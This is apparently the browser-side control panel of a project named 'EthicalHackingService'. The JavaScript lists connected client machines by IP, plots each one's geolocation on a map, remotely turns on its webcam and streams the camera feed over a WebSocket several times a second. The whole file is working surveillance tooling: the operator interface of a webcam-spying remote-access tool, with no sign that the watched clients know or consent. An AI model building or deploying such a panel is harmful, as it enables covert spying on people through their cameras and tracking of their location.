
var webcamIntervalId;
var webcamClientIP;
var img = document.getElementById("webcamImage");

// -----------------Webcam-AjaxSwitch Script - Start----------------- //
(function() {
	$("#errorMessage").html("");
	$("#successMessage").html("");

	$("#webcamClientTable").hide();
	$("#webcamClientTable tbody").empty();
	
	$.ajax({
		type : "POST",
		url : "/EthicalHackingService/AppController",
		data : "requestType=getWebcamClients",
		success : function(response) {
			if (response.status == "success") {
				var webcamList = response.data;
				if(webcamList.length) {
					for (var i = 0; i < webcamList.length; i++) {
						$("#webcamClientTable tbody").append("<tr><td class='col-md-4'>"
								+ encodeHtml(webcamList[i].clientIP)
								+ "</td><td class='col-md-4'>"
								+ "<button class='btn btn-primary btn-xs' onclick=\"showGeoLocation('"
								+ encodeHtml(webcamList[i].clientIP) + "', '" + encodeHtml(webcamList[i].geoLocation)
								+ "')\" data-toggle='modal' data-target='#geoLocationModal'>"
								+ "Display Geo-Location</button>"
								+ "</td><td class='col-md-4'>"
								+ "<button class='btn btn-primary btn-xs' onclick=\"showWebcamFeed('"
								+ encodeHtml(webcamList[i].clientIP)
								+ "')\" data-toggle='modal' data-target='#webcamModal'>"
								+ "Display Webcam</button>"
								+ "</td></tr>")
					}
					$("#webcamClientTable").show();
				} else {
					$("#errorMessage").html("No webcam client online currently!");
				}
			} else {
				$("#errorMessage").html(encodeHtml(response.data));
			}
		},
		error : function(xhr) {
			if (xhr.status == 401) {
				location.href = location.protocol + '//' + location.host + '/EthicalHackingService';
			}
		}
	});
	
	$('#geoLocationModal').on('hidden.bs.modal', function () {
		$("#errorMessage").html("");
	});
	
	$('#webcamModal').on('hidden.bs.modal', function () {
		$("#errorMessage").html("");
		
		$.ajax({
			type : "POST",
			url : "/EthicalHackingService/AppController",
			data : "requestType=webcamSwitch&clientIP="+ webcamClientIP + "&turnOnCam=no",
			success : function(response) {
				if (response.status == "success") {
					clearInterval(webcamIntervalId);
				} else {
					$("#errorMessage").html(encodeHtml(response.data));
				}
			},
			error : function(xhr) {
				if (xhr.status == 401) {
					location.href = location.protocol + '//' + location.host + '/EthicalHackingService';
				}
			}
		});
	});
})();

function showGeoLocation(clientIP, geoLocation) {
	$("#errorMessage").html("");
	$("#geoLocationModalTitle").html(encodeHtml(clientIP));
	
	var latLong = geoLocation.split(",");
	var latLoc = parseFloat(latLong[0]);
	var longLoc = parseFloat(latLong[1]);
	
	marker = {
			type: 'FeatureCollection',
			features: [{
				type: 'Feature',
				geometry: {type: 'Point', coordinates: [longLoc, latLoc]},
				properties: {name: 'Webcam Client Location'}
			}]
	};
	
	var map = new google.maps.Map(document.getElementById("geoLocationImage"), {
		zoom: 13,
		center: {lat: latLoc, lng: longLoc}
	});
	
	map.data.setStyle(function(feature) {
		return {
			title: feature.getProperty('name'),
			optimized: true,
			icon:feature.getProperty('icon')
		};
	});
	map.data.addGeoJson(marker);
}

function showWebcamFeed(clientIP) {
	$("#errorMessage").html("");
	$("#webcamModalTitle").html(encodeHtml(clientIP));
	
	img.src = "resources/app/images/processing_digital.gif";
	webcamClientIP = clientIP;
	
	$.ajax({
		type : "POST",
		url : "/EthicalHackingService/AppController",
		data : "requestType=webcamSwitch&clientIP="+ webcamClientIP + "&turnOnCam=yes",
		success : function(response) {
			if (response.status == "success") {
				setTimeout(function(){ remoteCamStart() }, 10000);
			} else {
				$("#errorMessage").html(encodeHtml(response.data));
			}
		},
		error : function(xhr) {
			if (xhr.status == 401) {
				location.href = location.protocol + '//' + location.host + '/EthicalHackingService';
			}
		}
	});
}
//------------------Webcam-AjaxSwitch Script - End------------------ //

//------------------------------------------------------------------ //

//-----------------Webcam-WebSocket Script - Start----------------- //
var socket = new WebSocket("ws://siddhant3146324:8080/EthicalHackingService/actions");

socket.onopen = function() {
	//console.log("Opened connection to websocket!");
}

socket.onmessage = function(event) {
	var webcam = JSON.parse(event.data);
	if (webcam.action == "init") {
		//console.log("websocket initialized!");
	} else if (webcam.action == "webcam") {
		img.src = webcam.blobString;
	}
}

function getWebcamFeed(clientIP) {
	var webcamParam = {
		action : "admin",
		clientIP : webcamClientIP
	};

	socket.send(JSON.stringify(webcamParam));
}

function remoteCamStart() {
	webcamIntervalId = setInterval(function() {
		getWebcamFeed()
	}, 250);
}

function remoteCamStop() {
	clearInterval(webcamIntervalId);
}
//------------------Webcam-WebSocket Script - End------------------ //